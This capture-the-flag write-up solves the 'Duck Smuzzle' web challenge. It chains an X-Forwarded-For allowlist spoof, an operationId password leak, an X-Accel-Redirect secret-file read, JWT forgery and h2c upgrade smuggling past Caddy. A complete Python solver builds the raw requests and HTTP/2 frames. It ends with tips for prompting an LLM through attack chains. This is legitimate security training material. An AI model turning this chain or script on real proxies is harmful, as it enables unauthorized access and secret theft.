---
title: "Duck Smuzzle"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "Chain an X-Forwarded-For allowlist bypass and an OpenAPI operationId leak into an X-Accel-Redirect file read, forge a JWT, then h2c-smuggle past Caddy to reach the blocked /duck route."
icon: "🦆"
---

## Summary

Duck Smuzzle is a multi-proxy web challenge: Caddy (h2c-enabled) fronts nginx, which fronts a FastAPI/hypercorn backend whose "WAF" is really an IP allowlist (`fastapi-guard`, whitelist `67.67.67.67`). The solve is a five-link chain — spoof `X-Forwarded-For` to satisfy the allowlist, leak a handler password out of `/openapi.json`'s `operationId`, abuse a response-header-injection sink to trigger `X-Accel-Redirect` and read the JWT secret file, forge an `HS256` `{"role":"duck"}` token, and finally **HTTP/2-cleartext (h2c) smuggle** a request to the `/duck` route both proxies otherwise block. I recognized each link by its signature and steered; the LLM did the grinding — parsing configs, diffing the schema, byte-fiddling the JWT, and assembling the raw h2c frames.

## Solution

This was the kind of challenge where my job was almost entirely **pattern recognition and steering**. Every individual step is a known technique with a known smell, but stitching five of them together — and not getting lost mid-chain — is where an LLM partner earns its keep. I'd recognize "ah, this is an `X-Accel-Redirect` internal-redirect read," set the direction, and let the model do the careful, error-prone work of producing exact bytes. The flavor text `wh0_smuggl3_my_403` basically announced the finale (smuggling + a 403 wall), which I took as the north star from the first minute.

Below is the chain in the order it actually unfolded, with the *why* behind each move and the dead-ends that mattered.

### The architecture, and where the trust boundaries leak

Three hops, each re-deriving "who is the client?" differently — and that mismatch is the whole game.

- **Caddy** on port 80, **h2c-enabled**. Blocks path `/duck*` and *overwrites* `X-Forwarded-For` (so you cannot spoof XFF straight through the front door).
- **nginx** on port 81. `^~ /duck` is blocked here too. It has an `internal` `/private` location that serves the JWT-secret file, and it *prepends* the client IP to `X-Forwarded-For`.
- **hypercorn + FastAPI** backend, guarded by `fastapi-guard` with `whitelist=["67.67.67.67"]` and `exclude_paths=["/goose","/flag"]`.

The first insight is that **the "WAF" is just an IP allowlist**, and `fastapi-guard` trusts the *first* entry of `X-Forwarded-For`. That's why, early on, only `/goose//flag`-style paths were reachable at all — those were the `exclude_paths`. Everything else needed us to *look like* `67.67.67.67`.

The catch: Caddy *overwrites* XFF, but nginx merely *prepends*. So if we reach **nginx directly on port 81**, our spoofed value lands at the head of the list and the backend's guard reads `67.67.67.67` as the first hop.

```
client → Caddy:80  (blocks /duck*, OVERWRITES X-Forwarded-For)
       → nginx:81  (blocks /duck, PREPENDS client IP, has internal /private)
       → FastAPI    (guard: whitelist 67.67.67.67, trusts FIRST XFF entry)
```

### Step 1 — Allowlist bypass via X-Forwarded-For, read the OpenAPI schema

Send `X-Forwarded-For: 67.67.67.67` to nginx (port 81). The guard reads the first XFF token, matches the whitelist, and we're "internal." First thing to pull is `/openapi.json` — FastAPI serves it for free, and it's a complete map of every route, parameter, and (crucially) `operationId`.

The control run that *proved* the mechanism: the same request **with** the spoofed XFF returned `200`; **without** it, `403`. That binary became my verification lever for the whole chain — any time I doubted a link, I re-ran with and without the spoof and diffed the status code.

### Step 2 — Leak the handler password out of `operationId`

FastAPI auto-generates each route's `operationId` from the **Python function name** of the handler. The Dockerfile for this challenge had renamed the `/duck` handler's function to a **random password token**, so the secret was sitting in plain sight in the schema:

```
operationId: d8XAO6H7enCGx5V4fWhsBvgztyPNEbKq
```

That string is the `password` query parameter the `/flag` and `/duck` handlers gate on. This step is *obvious in hindsight and invisible if you're not looking* — you have to know FastAPI leaks function names into the schema. The model knew the fact; my contribution was telling it to stop staring at route *paths* and go diff the `operationId` fields specifically.

### Step 3 — X-Accel-Redirect file read to leak the JWT secret

Now the clever bit. The `/flag` handler (reachable because it's in `exclude_paths`, gated by the leaked `password`) lets you set arbitrary **response headers** — effectively `response.headers[x] = y`. That's a classic **response-header-injection sink**, and the payoff against nginx is `X-Accel-Redirect`.

`X-Accel-Redirect` is nginx's mechanism for letting a backend say "serve *this* internal location to the client." nginx's `/private` location is marked `internal`, so a client can never request it directly — but a backend response carrying `X-Accel-Redirect: /private` makes nginx serve it anyway. `/private` returns the `.jwtenv` file:

```
JWT_SECRET=<the real signing secret>
```

The dead-end here is assuming you need a path traversal or LFI to read the secret file. You don't — nginx hands it over the instant you make the backend emit the right header, and the header sink is a documented feature of the `/flag` handler. Recognizing "header injection + nginx ⇒ `X-Accel-Redirect` internal read" instead of going down an LFI rabbit hole saved real time.

### Step 4 — Forge the JWT

With the real `JWT_SECRET` in hand, mint an `HS256` token with the privileged claim:

```json
{"role": "duck"}
```

Verification gotcha that actually bit: I tried tokens signed with `dev_secret` and with *the password from Step 2 used as the secret* — both returned `"quack"` (the rejection response). Only a token signed with the **leaked `JWT_SECRET`** produced the flag. So `"quack"` became my negative oracle: wrong secret ⇒ quack, right secret ⇒ flag. That distinction is what kept me from convincing myself I'd already won.

### Step 5 — h2c smuggling to reach the blocked `/duck` route

The final wall: both Caddy and nginx block `/duck`, and Caddy overwrites XFF, so even with a perfect JWT a normal request to `/duck` dies at the proxy and/or fails the allowlist. The challenge's own source even carried a TODO comment that the intended flow was "currently unsolvable" — the **h2c upgrade smuggle is the trick that bypasses the broken proxy config**.

**Why it works.** Caddy is h2c-enabled. If a client sends an HTTP/1.1 request with `Connection: Upgrade` and `Upgrade: h2c`, Caddy answers `101 Switching Protocols` and from that point treats the connection as raw **HTTP/2 cleartext**. The tunnel is established *before* Caddy's path-matching middleware inspects the smuggled HTTP/2 stream — so the `GET /duck` we send *inside* the tunnel never trips Caddy's `/duck*` block. Just as importantly, the tunneled stream's headers pass through, so our attacker-controlled `X-Forwarded-For: 67.67.67.67` survives instead of being overwritten.

So the smuggled HTTP/2 stream carries everything at once:

- `GET /duck?password=d8XAO6H7enCGx5V4fWhsBvgztyPNEbKq`
- `X-Forwarded-For: 67.67.67.67` (satisfies the guard, *not* stripped because we're inside the tunnel)
- the forged `role=duck` token in the cookie

…and the backend returns `v1t{wh0_smuggl3_my_403}`.

The control that nailed the mechanism: the *same* `/openapi.json` request sent **over the h2c tunnel with spoofed XFF** returned `200`, and **without** the tunnel/spoof returned `403`. That A/B proved the tunnel both reached the backend *and* preserved our XFF before I bet the whole chain on it.

### End-to-end script

One runnable path from challenge host to printed flag. It performs the allowlist bypass straight against nginx, scrapes the password from the schema, triggers the `X-Accel-Redirect` read to recover the secret, forges the token by hand, then opens a raw h2c tunnel through Caddy and smuggles the final `/duck` request.

```python
#!/usr/bin/env python3
"""
Duck Smuzzle - V1t CTF 2026 end-to-end solver.
Chain: XFF allowlist bypass -> operationId password leak ->
       X-Accel-Redirect JWT-secret read -> forge HS256 JWT ->
       h2c upgrade smuggle to the blocked /duck route.
deps: pip install h2
"""
import socket, json, hmac, hashlib, base64
import h2.connection, h2.config, h2.events

HOST  = "duck.v1t.ctf"      # target host
CADDY = 80                  # h2c-enabled front proxy
NGINX = ("duck.v1t.ctf", 81)  # nginx, prepends client IP to XFF
XFF   = "67.67.67.67"       # fastapi-guard whitelist entry

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

# --- raw HTTP/1.1 helper straight to nginx (so our spoofed XFF lands first) ---
def nginx_get(path):
    s = socket.create_connection(NGINX)
    req = (f"GET {path} HTTP/1.1\r\nHost: {NGINX[0]}\r\n"
           f"X-Forwarded-For: {XFF}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(req)
    data = b""
    while chunk := s.recv(4096):
        data += chunk
    s.close()
    return data.decode(errors="replace")

# --- Step 1+2: bypass the allowlist and scrape the password from operationId --
def leak_password():
    resp = nginx_get("/openapi.json")
    status = resp.split("\r\n", 1)[0]
    assert "200" in status, f"XFF bypass failed -> {status} (wrong hop?)"
    body = resp.split("\r\n\r\n", 1)[1]
    # FastAPI derives operationId from the handler's Python function name,
    # which the Dockerfile replaced with the random password token.
    pw = json.loads(body)["paths"]["/duck"]["get"]["operationId"]
    print("[+] password (from operationId):", pw)
    return pw

# --- Step 3: header-injection sink -> X-Accel-Redirect -> read /private -------
def leak_jwt_secret(password):
    # /flag is in exclude_paths; its response.headers[x]=y feature lets us set
    # X-Accel-Redirect, making nginx serve the internal /private (.jwtenv).
    path = f"/flag?password={password}&response.headers[X-Accel-Redirect]=/private"
    leak = nginx_get(path)
    secret = leak.split("JWT_SECRET=", 1)[1].split()[0]
    print("[+] JWT_SECRET:", secret)
    return secret

# --- Step 4: forge the privileged token by hand ------------------------------
def forge_token(secret):
    hdr = b64u(json.dumps({"alg": "HS256", "typ": "JWT"},
                          separators=(",", ":")).encode())
    pay = b64u(json.dumps({"role": "duck"}, separators=(",", ":")).encode())
    sig = b64u(hmac.new(secret.encode(), hdr + b"." + pay, hashlib.sha256).digest())
    token = (hdr + b"." + pay + b"." + sig).decode()
    print("[+] forged role=duck JWT")
    return token

# --- Step 5: raw h2c upgrade + HTTP/2 smuggle of GET /duck --------------------
def h2c_smuggle_duck(password, token):
    s = socket.create_connection((HOST, CADDY))
    # HTTP/1.1 upgrade dance: ask Caddy to switch to h2c.
    s.sendall(
        f"GET / HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n".encode()
    )
    assert b"101" in s.recv(4096), "no 101; h2c not enabled on this hop"
    # From here the socket is raw HTTP/2 cleartext, *behind* Caddy's path matcher.
    conn = h2.connection.H2Connection(
        config=h2.config.H2Configuration(client_side=True))
    conn.initiate_upgrade_connection()
    s.sendall(conn.data_to_send())
    conn.send_headers(1, [
        (":method", "GET"),
        (":path", f"/duck?password={password}"),
        (":authority", HOST), (":scheme", "http"),
        ("x-forwarded-for", XFF),       # survives: we're inside the tunnel
        ("cookie", f"role={token}"),
    ], end_stream=True)
    s.sendall(conn.data_to_send())
    out = b""
    while chunk := s.recv(4096):
        for ev in conn.receive_data(chunk):
            if isinstance(ev, h2.events.DataReceived):
                out += ev.data
            if isinstance(ev, h2.events.StreamEnded):
                s.close()
                return out.decode(errors="replace")
    return out.decode(errors="replace")

if __name__ == "__main__":
    pw     = leak_password()
    secret = leak_jwt_secret(pw)
    token  = forge_token(secret)
    out    = h2c_smuggle_duck(pw, token)
    print("[FLAG]", out)
```

Run order is exactly the dependency chain: password → secret → token → smuggle. If `leak_password` returns `403`, the XFF bypass isn't landing (you're hitting Caddy's overwrite — make sure you're talking to nginx:81). If the final response is `"quack"`, the token is signed with the wrong secret — re-check Step 3, not Step 5.

## Flag

```
v1t{wh0_smuggl3_my_403}
```

## Lessons learned - prompting the AI

This challenge is a *chain*, and the failure mode with an LLM is letting it wander off mid-chain or hallucinate a step that "feels" plausible. The discipline that worked: name the technique, pin each link with a verifiable oracle, and forbid the obvious rabbit holes up front.

**Prompts that actually moved the solve.**

> "Here are the Caddy, nginx, and Dockerfile configs. Map every trust boundary: for each proxy, tell me exactly how it derives the client IP and how it mutates `X-Forwarded-For`. I think the WAF is an IP allowlist — confirm which header/entry `fastapi-guard` trusts and whether it's the first or last XFF token."

That one prompt produced the whole "nginx prepends, Caddy overwrites, guard trusts the first token" picture the entire chain hinges on. Forcing per-hop reasoning about XFF mutation is what surfaced the bypass.

> "This is a FastAPI app and I can read `/openapi.json`. Don't look at the route *paths* — diff the `operationId` fields. FastAPI builds those from the Python function name, and I suspect the Dockerfile renamed a handler to a secret. Extract any operationId that looks like a random token."

Aiming the model at `operationId` specifically (and telling it to ignore paths) was the difference between a 10-second leak and an hour of staring at the schema.

> "The `/flag` handler lets me set arbitrary response headers, we're behind nginx, and there's an `internal` `/private` location. Give me the single header that makes nginx serve an internal location to the client — and do NOT suggest path traversal or LFI; the read is via an nginx feature, not the filesystem."

**What to focus the model on / dead-ends to forbid.**
- Tell it the WAF is an **IP allowlist**, not a payload filter — it stops trying to obfuscate payloads and starts thinking about *who it appears to be*.
- Point it at `operationId`, not route paths, for the FastAPI leak.
- Explicitly forbid **LFI / path traversal** for the secret-file read; the answer is `X-Accel-Redirect`, an nginx internal-redirect feature.
- Explicitly forbid spoofing XFF *through Caddy's front door* — Caddy overwrites it; the move is to reach **nginx directly** or smuggle.
- For the finale, tell it the goal is to **preserve attacker-controlled XFF past Caddy while simultaneously bypassing the `/duck` path block**, and that the lever is **h2c upgrade smuggling** — otherwise it reaches for HTTP/1.1 request smuggling (CL.TE/TE.CL), which is the wrong target here.

**How I caught the model's mistakes.** Every link had a binary oracle and I refused to advance without it:
- *XFF bypass:* same request **with** spoof → `200`, **without** → `403`. If both are `403`, you're on the wrong hop.
- *JWT secret:* `"quack"` = wrong secret, flag = right secret. When the model "confirmed" a token built from the password-as-secret, the `"quack"` response caught the lie immediately — I made it treat `"quack"` as a hard failure, not a near-miss.
- *h2c tunnel:* require a `101 Switching Protocols` on the upgrade, then A/B the same `/openapi.json` over the tunnel (`200`) vs. without (`403`) to prove the tunnel both reaches the backend *and* preserves XFF before betting the chain on it.

**Fast-path prompt recipe for next time:** "Multi-proxy stack — map each hop's XFF mutation and which token the IP allowlist trusts; leak FastAPI secrets from `operationId`; turn any response-header sink into an `X-Accel-Redirect` internal read (no LFI); then h2c-upgrade-smuggle to carry spoofed XFF past the front proxy onto the path-blocked route — and verify every link with a with/without status diff before advancing."
